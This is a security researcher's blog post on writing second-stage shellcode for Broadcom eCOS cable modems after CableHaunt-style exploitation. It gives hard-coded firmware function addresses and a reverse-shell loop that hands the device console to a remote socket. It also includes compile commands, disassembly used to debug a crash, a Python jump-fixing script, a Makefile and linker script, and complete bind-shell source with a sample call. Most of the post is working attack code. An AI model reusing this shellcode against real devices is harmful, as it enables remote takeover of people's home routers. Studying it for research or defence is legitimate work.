---
layout: post
title: Broadcom eCOS | Building Custom Shellcode
description: In this article I’ll explain how to craft shellcode that you can deliver as a second stage to a victim eCOS device.
author: qkaiser
summary: In this article I’ll explain how to craft shellcode that you can deliver as a second stage to a victim eCOS device. I’m specifically covering the Broadcom variant of eCOS here.
image: /assets/bcm_shellcode_r2.jpg
date: 2021-03-07 09:00:00
tags: [ecos, shellcode, exploit, broadcom]
---

![head]({{site.url}}/assets/bcm_shellcode_r2.jpg)

In this article I'll explain how to craft shellcode that you can deliver as a second stage
to a victim eCOS device. I'm specifically covering the Broadcom variant of eCOS here.

I'll cover two techniques for building these:

- manual function mapping
- using the GCC linker

I know relying on the GCC linker is the best method but I chose to document both so that
everyone can understand why.

### Method 1: Manual Function Hooking + Code Fixup

I'm merely documenting what folks at Lyrebird did when exploiting the CableHaunt vulnerability.
They published the code we'll be documenting today on Github. If you prefer to read it for yourself,
just head to [https://github.com/Lyrebirds/sagemcom-fast-3890-exploit/blob/master/reverseshell.c](https://github.com/Lyrebirds/sagemcom-fast-3890-exploit/blob/master/reverseshell.c).

#### Function Mapping

The code starts by defining functions addresses:

{% highlight c %}
#define RECV_ADDR 0x80d9642c
#define CONSOLE_EXECUTE_ADDR 0x8024e2ec
#define GET_CONSOLE_SINGLETON_ADDR 0x8024e298
#define MALLOC_ADDR 0x8002a554
#define BZERO_ADDR 0x80d3fce8
#define CYG_FP_GET 0x80d93cf8
#define CYG_FP_FREE 0x80d93d60
#define CYG_FD_ASSIGN 0x80d93c20
#define STRCPY_ADDR 0x80d3f414
#define PRINTF_ADDR 0x80bc9b38
#define SEND_ADDR 0x80d96544
{% endhighlight %}

Then the fixed address where the socket file descriptor value is saved. This address is shared by both the shellcode
and the ROP chain so that the shellcode can re-use the opened socket from which the ROP chain read the shellcode received
from the attack server.

A command offset is also defined, but we will get back to it later.

{% highlight c %}
#define SAVED_SOCKET_ADDR 0x8648d984
#define COMMAND_OFFSET 0x1080
{% endhighlight %}

The code then defines function prototypes in the manner of a C header file. We have function from standard unix libraries
and cygnus libraries, followed by custom function from Broadcom Foundation Classes (BcmConsole):

{% highlight c %}
typedef void* strcpy_t(void* to, void const* from);
typedef int recv_t(int s, void* buf, unsigned int len, int flags);
typedef unsigned int *send_t(int s, void const* buf, unsigned int len, int flags);
typedef void* malloc_t(unsigned int size);
typedef void* bzero_t(void* block, unsigned int size);
typedef int sleep_t(unsigned int zzz);
typedef void *cyg_fp_get_t(int fd);
typedef void cyg_fp_free_t(void *fp);
typedef int cyg_fd_assign_t(int fd, void *fp);
typedef int printf_t(char *str, ...);

typedef void* BcmConsoleGetSingletonInstance_t(void);
typedef int BcmConsoleExecuteCurrentCommand_t(void* console);
{% endhighlight %}

Once addresses and prototypes are defined, the code maps those:

{% highlight c %}
recv_t *recv_ptr = (recv_t *) RECV_ADDR;
malloc_t *malloc_ptr = (malloc_t *) MALLOC_ADDR;
bzero_t *bzero_ptr = (bzero_t *) BZERO_ADDR;
strcpy_t *strcpy_ptr = (strcpy_t *) STRCPY_ADDR;
printf_t *printf_ptr = (printf_t *) PRINTF_ADDR;
send_t *send_ptr = (send_t *) SEND_ADDR;

cyg_fp_get_t *cyg_fp_get_ptr = (cyg_fp_get_t *) CYG_FP_GET;
cyg_fp_free_t *cyg_fp_free_ptr = (cyg_fp_free_t *) CYG_FP_FREE;
cyg_fd_assign_t *cyg_fd_assign_ptr = (cyg_fd_assign_t *) CYG_FD_ASSIGN;

BcmConsoleExecuteCurrentCommand_t *consoleExecute_ptr = (BcmConsoleExecuteCurrentCommand_t *) CONSOLE_EXECUTE_ADDR;
BcmConsoleGetSingletonInstance_t *consoleGetInstance_ptr = (BcmConsoleGetSingletonInstance_t *) GET_CONSOLE_SINGLETON_ADDR;
{% endhighlight %}

We have to do that because we cannot execute dynamic linking or execute syscalls :)

#### Variables Initialization

It initializes the variables it will need:

{% highlight c %}
int socket = *((int *)SAVED_SOCKET_ADDR);
void *buffer = malloc_ptr(0x100);
void *consoleInstance = consoleGetInstance_ptr();
int receivedBytes = 0x0;
{% endhighlight %}

It redirects standard I/O to our opened socket connection. This is the functional equivalent of calling dup2 on Linux. 

{% highlight c %}
// map a descriptor to a file object.
void *fp = cyg_fp_get_ptr(socket);
// assign a file object to a descriptor
cyg_fd_assign_ptr(0x1, fp);
// free the usecount reference
cyg_fp_free_ptr(fp);
{% endhighlight %}

#### Command Loop

Then the code enters a loop to receive and execute commands. This code imitates what serial, telnet, or SSH console handler
of the Broadcom platform executes when a session is open.

{% highlight c %}
while (1) {
    // zero out the receive buffer
    bzero_ptr(buffer, 0x100);
    // receive content
    receivedBytes = recv_ptr(socket, buffer, 0x100, 0x0);
    // if we received something
    if (receivedBytes > 0) {
        // copy received content into the consoel command buffer
        char *commandBuffer = ((char *)consoleInstance);
        commandBuffer += COMMAND_OFFSET;
        strcpy_ptr(commandBuffer, buffer);
        // null byte termination
        commandBuffer[receivedBytes+1] = 0x0;
        // execute the command
        consoleExecute_ptr(consoleInstance);
    }
}
return 0;
{% endhighlight %}

The commands are received and executed by a dedicated Thread (BcmEcRemoteTerminalConsoleThread -> BcmEcTerminalConsoleThread -> BcmTerminalConsoleThread).


#### Command Offset 

One thing I noticed during my experiences with this platform is that the command offset is not alway the same. For example, it is
0x107d on Sagemcom devices but 0x1080 on Netgear and ASKEY.

{:.foo}
![ecos_command_offset_netgear]({{site.url}}/assets/ecos_command_offset_netgear.png)

If you're looking for *BcmConsoleExecuteCurrentCommand*, cross-reference the string *'is not a valid command table'*. The function
that references that string is *BcmConsoleExecuteCurrentCommand*. You can then cross-reference calls to that function and identify
the proper command offset that you need to use for your target.

### Compiling Shellcode

To compile C code for our target you'll need to obtain the right toolchain. You can either download it from [the Internet](http://ftp.twaren.net/Unix/sourceware.org/ecos/gnutools/i386linux/ecoscentric-gnutools-mipsisa32-elf-1.4-2.i386linux.tar.bz2) if you're brave enough. Or build it yourself such as described in [eCOS Firmware Analysis with Ghidra](#TODO) (remember, we needed the toolchain to build eCOS shared libraries).

Once your toolchain is set, you can compile it to an object file with gcc and then exporting a raw binary file from it:

{% highlight bash %}
${TOOLCHAIN_HOME}/mipsisa32-elf-gcc -O3 -c reverseshell.c -o reverseshell.o
${TOOLCHAIN_HOME}/mipsisa32-elf-objcopy -O binary reverseshell.o shellcode.raw
{% endhighlight %}

#### Relative Jump Issues

If we use this shellcode as-is, we'll encounter one problem: the device crash after executing the first command we send.

This is the exact crash I got:

{% highlight asm %}
>>> YIKES... looks like you may have a problem! <<<

r0/zero=00000000 r1/at  =00000000 r2/v0  =00000001 r3/v1  =815e0000
r4/a0  =861a4328 r5/a1  =87d6fae8 r6/a2  =86485d80 r7/a3  =86485fc0
r8/t0  =86485fc0 r9/t1  =00000408 r10/t2 =5e97d3bd r11/t3 =000043e0
r12/t4 =00000001 r13/t5 =7472756d r14/t6 =5f616e61 r15/t7 =6c797a65
r16/s0 =80d3fce8 r17/s1 =00000005 r18/s2 =86e01d4c r19/s3 =861a4328
r20/s4 =00000039 r21/s5 =80d9642c r22/s6 =86e00ccc r23/s7 =8024e2ec
r24/t8 =00000000 r25/t9 =00000000 r26/k0 =00000000 r27/k1 =00000000
r28/gp =8161e5d0 r29/sp =86486028 r30/fp =80d3f414 r31/ra =864df2d0

PC   : 0x800000a8    error addr: 0x00000000
cause: 0x1000002c    status:     0x1000ff03

BCM interrupt enable: 18024085, status: 00000000
Instruction at PC: 0xd7f7fffb
iCache Instruction at PC: 0xa3a0001c

Return address (864df2d0) invalid.  Trace stops.
{% endhighlight %}

Let's decompile our shellcode with radare2 to understand what's happening !

{% highlight asm %}
r2 -a mips -b 32 exploit.raw
[0x00000000]> e cfg.bigendian=true
[0x00000000]> dd
[0x00000000]> pd
     0x00000000      3c028648       lui v0, 0x8648
     0x00000004      27bdffd8       addiu sp, sp, -0x28
     0x00000008      3442d984       ori v0, v0, 0xd984
     0x0000000c  ~   3c038002       lui v1, 0x8002
            ;-- pc:
     0x0000000f                    unaligned
     0x00000010      afbf0024       sw ra, 0x24(sp)
     0x00000014      24040100       addiu a0, zero, 0x100
     0x00000018      afbe0020       sw fp, 0x20(sp)
     0x0000001c      afb7001c       sw s7, 0x1c(sp)
     0x00000020      afb60018       sw s6, 0x18(sp)
     0x00000024      afb50014       sw s5, 0x14(sp)
     0x00000028      afb40010       sw s4, 0x10(sp)
     0x0000002c      afb3000c       sw s3, 0xc(sp)
     0x00000030      afb20008       sw s2, 8(sp)
     0x00000034      afb10004       sw s1, 4(sp)
     0x00000038      3c128024       lui s2, 0x8024
     0x0000003c      afb00000       sw s0, (sp)
     0x00000040      3463a554       ori v1, v1, 0xa554
     0x00000044      0060f809       jalr v1
     0x00000048      8c540000       lw s4, (v0)
     0x0000004c      3c1080d9       lui s0, 0x80d9
     0x00000050      3643e298       ori v1, s2, 0xe298
     0x00000054      0060f809       jalr v1
     0x00000058      00409821       move s3, v0
     0x0000005c      36033cf8       ori v1, s0, 0x3cf8
     0x00000060      02802021       move a0, s4
     0x00000064      0060f809       jalr v1
     0x00000068      0040b021       move s6, v0
     0x0000006c      00408821       move s1, v0
     0x00000070      36033c20       ori v1, s0, 0x3c20
     0x00000074      24040001       addiu a0, zero, 1
     0x00000078      0060f809       jalr v1
     0x0000007c      00402821       move a1, v0
     0x00000080      36023d60       ori v0, s0, 0x3d60
     0x00000084      0040f809       jalr v0
     0x00000088      02202021       move a0, s1
     0x0000008c      3c0380d3       lui v1, 0x80d3
     0x00000090      3615642c       ori s5, s0, 0x642c
     0x00000094      3657e2ec       ori s7, s2, 0xe2ec
     0x00000098      347ef414       ori fp, v1, 0xf414
     0x0000009c      26d21080       addiu s2, s6, 0x1080
     0x000000a0      3470fce8       ori s0, v1, 0xfce8
 ┌─> 0x000000a4      02602021       move a0, s3
┌──> 0x000000a8      0200f809       jalr s0
╎╎   0x000000ac      24050100       addiu a1, zero, 0x100
╎╎   0x000000b0      02802021       move a0, s4
╎╎   0x000000b4      02602821       move a1, s3
╎╎   0x000000b8      24060100       addiu a2, zero, 0x100
╎╎   0x000000bc      02a0f809       jalr s5
╎╎   0x000000c0      00003821       move a3, zero
╎└─< 0x000000c4      1840fff7       blez v0, 0xa4
╎    0x000000c8      00408821       move s1, v0
╎    0x000000cc      02402021       move a0, s2
╎    0x000000d0      03c0f809       jalr fp
╎    0x000000d4      02602821       move a1, s3
╎    0x000000d8      02511821       addu v1, s2, s1
╎    0x000000dc      a0600001       sb zero, 1(v1)
╎    0x000000e0      02e0f809       jalr s7
╎    0x000000e4      02c02021       move a0, s6
└──< 0x000000e8      0800002a       j 0xa8
     0x000000ec      02602021       move a0, s3
     0x000000f0      ffffffff       invalid
     0x000000f4      ffffffff       invalid
     0x000000f8      ffffffff       invalid
{% endhighlight %}

The problematic instruction is at 0x000000e8, which is the jump responsible for our while(1) loop:

{% highlight asm %}
└──< 0x000000e8      0800002a       j 0xa8
{% endhighlight %}

Given that the processor has no knowledge of the fact that our 'function' starts at offset 0x864df1e8 it will think it needs to jump to 0x80004000 (base address) + 0xa8 = 0x800040a8. And that's why the device crash with a PC address of 0x800000a8.

To fix this problem, we need to make this shellcode location aware and make it perform direct jumps rather than relative jumps.

To do so, we need to get the jump destination address. This is the shellcode start address + the relative offset where the loop starts (0x864df1e8 + 0xa8 = 0x864df290).

So we should have something along these lines

{% highlight asm %}
3c03864d    lui v1, 0x864d
3463f290    ori v1, v1, 0xf290
00600008    jr v1
{% endhighlight %}

I wrote the script below to fix this issue. For now only the fixed address can be provided but I plan
on adding support to replace arbitrary relative jumps in any shellcode for Broadcom eCOS.

{% highlight python %}
#!/usr/bin/env python3
'''
This code fix relative jumps in shellcode generated for Broadcom eCOS.

Author: Quentin Kaiser <quentin@ecos.wtf>
'''
import sys
import struct

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: {} shellcode_file jmp_addr".format(sys.argv[0]))
        sys.exit(-1)

    # j 0xa8
    old_instructions = b"\x08\x00\x00\x2a"

    target = int(sys.argv[2], 16)
    target_upper = target >> 16
    target_lower = target - (target_upper * 0x10000)

    # lui v1, target_upper
    new_instructions = b"\x3c\x03" + struct.pack(">H", target_upper)
    # ori v1, v1, target_lower
    new_instructions += b"\x34\x63" + struct.pack(">H", target_lower)
    # jr v1
    new_instructions += b"\x00\x60\x00\x08"

    with open(sys.argv[1], 'rb') as f:
        content = f.read()
        content = content.replace(old_instructions, new_instructions)
        with open('{}.fixed'.format(sys.argv[1]), 'wb') as f2:
            f2.write(content)
{% endhighlight %}


### Method 2: GCC Linker

> If you looked at [@stdw](https://github.com/stdw/) [code](https://github.com/stdw/cm-sdr/) to turn a Cable Modem into a cheap SDR,
you probably know what the build process will look like. Interestingly, I had built similar capabilities but turns out their code
is cleaner so I borrowed from them. Go check out their repo !

Instead of manually typing function addresses in the source code, redefining the function prototypes, and setting functions pointers, we can
simply rely on GCC `-T` option that allows us to provide our own linker script.

{% highlight asm %}
-T script Use script as the linker script.  This option is supported by most systems using the GNU linker.  On some targets, such as bare-board targets without an operating system, the -T option may be required when linking to avoid references to undefined symbols.
{% endhighlight %}

If you want to follow along, all the content below has been made public on our [Github](https://github.com/ecos-wtf/recos).

#### Makefile

We can combine that with a Makefile to make things even easier:

{% highlight make %}
PLATFORM=CG3700
TCPREFIX=gnutools/mipsisa32-elf/bin/mipsisa32-elf-
CC=$(TCPREFIX)gcc
OBJCOPY=$(TCPREFIX)objcopy
LDSCRIPT=$(PLATFORM)/payload.ld
CFLAGS=-march=mips32 -mabi=eabi -msoft-float -mno-abicalls -fno-builtin -nostdlib -nodefaultlibs -nostartfiles -T $(LDSCRIPT)

default: reverseshell.bin

reverseshell.elf:
	$(CC) reverseshell.c -o $@ $(CFLAGS)

reverseshell.bin: reverseshell.elf
	$(OBJCOPY) -O binary -j .start -j .text -j .data -j .rodata $< $@
{% endhighlight %}

Setup the right application binary interface options:

- **march=mips32**
- **mabi=eabi**
- **msoft-float**

Remove compiler optimizations:

- **mno-abilcalls** - Do not generate code that is suitable for SVR4-style dynamic objects.
- **fno-builtin** - Tells the compiler not to use generic handling and optimization of standard C and C++ library functions and operators.

Do not use standard libraries when linking:

- **nostdlib** - Do not use the C library or system libraries tightly coupled with it when linking.
- **nodefaultlibs** - Do not use the standard system libraries when linking.
- **nostartfiles** - Do not use the standard system startup files when linking.

#### Linker Script

The linker script will contain the addresses of functions you plan on using and the
SECTIONS definition set the start address where your shellcode should be written to in
memory:

{% highlight c %}
socket = 0x80d95970;
bind = 0x80d95c78;

//--snip--

SECTIONS
{
  . = 0x80810000;
  .start : { *(.start) }
  .text : { *(.text) }
  .data : { *(.data) }
  .rodata : { *(.rodata) }
}
{% endhighlight %}

#### Shellcode

This time let's setup a bindshell:

{% highlight c %}
#include "external.h"
#include "payload.h"
/**
 * This is the most basic reverse shell example I could come up with.
 * This is blocking when called from the CLI.   
 */
#define PAYLOAD_PRIORITY     23
#define PAYLOAD_STACKSIZE  0x2000
#define COMMAND_OFFSET  0x1080

int __start(unsigned long ip_address, unsigned short port)
{
    // create remote host sockaddr structure with received IP
    // and port as command line parameters
    struct sockaddr_in* host = (struct sockaddr_in*)\
        malloc(sizeof(struct sockaddr_in)); 
    host->sin_family = AF_INET;
    host->sin_port = port; 
    host->sin_addr.s_addr = ip_address;

    int sockfd;
    int recvd;
    int client_sockfd;
    int new_addrlen;
    struct sockaddr_in client_addr;

    char addrbuf[16];
    inet_ntop4(&host->sin_addr, addrbuf, sizeof(addrbuf));
    printf("[+] Launching bind shell on %s:%d\n", addrbuf, host->sin_port);
    
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        printf("[!] socket error - %s\n", strerror(errno));
    }

    // without sleep, the sockfd does not work for some reason
    sleep(2);

    if (bind(sockfd, host, 0x2020) != 0) {
        printf("[!] bind error - %s\n", strerror(errno));
        return -1;
    }
    printf("[+] bind successful\n");

    if (listen(sockfd, 0) < 0) {
        printf("[!] listen error - %s\n", strerror(errno));
        return -1;
    }

    printf("[+] listen successful");

    for(;;){
        new_addrlen = sizeof(client_addr);
        client_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &new_addrlen);
        if(client_sockfd < 0){
            printf("[!] accept error - %s\n", strerror(errno));
            return -1;
        }
        void *buffer = malloc(0x100);
        if(buffer == NULL){
            printf("[!] Error when allocating buffer.\n");
            return -1;
        }

        void *console_instance = BcmConsoleGetSingletonInstance();
        int *fp = (int*)cyg_fp_get(client_sockfd);
        cyg_fd_assign(0x1, fp);
        cyg_fp_free(fp);

        while (1)
        {
            bzero(buffer, 0x100);
            recvd = recv(client_sockfd, buffer, 0x100, 0x0);
            if (recvd > 0) {
                char *command_buffer = ((char *)console_instance);
                command_buffer += COMMAND_OFFSET;
                strcpy(command_buffer, buffer);
                if(strncmp("exit", buffer, 4) == 0) {
                    break;
                }
                command_buffer[recvd+1] = 0x0;
                BcmConsoleExecuteCurrentCommand(console_instance);
            }
            else{
                // -1 is error; 0 is disconnected
                break;
            }
        }
        close(client_sockfd);
        break;
    }
    printf("[+] Quitting. Reassigning console.\n");
    int* fp = (int*)cyg_fp_get(2);
    cyg_fd_assign(0x01, fp);
    cyg_fp_free(fp);
    close(sockfd);
    return 0;
}
{% endhighlight %}

#### Calling

The shellcode has been designed to accept parameters from the command line when called using
the *call* CLI command:

{% highlight asm %}
CM> call func -r -a 0x80810000 0x00000000 0x115c
Calling function 0x80810000(0x00000000, 0x115c)
[+] Launching bind shell on 0.0.0.0:4444
{% endhighlight %}


### Conclusion

You now have all the tools to write your own reverse shell shellcode and deliver it to your [ROP chain handler](#TODO).

A repository with a bunch of shellcodes (reverse shell, bind shell, reverse shell in a thread, bind shell in a thread, sample threading app) is now available on [Github](https://github.com/ecos-wtf/ecoshell).

As always, if you have any question feel free to contact me via [Twitter](https://twitter.com) or [email](mailto:quentin@ecos.wtf).
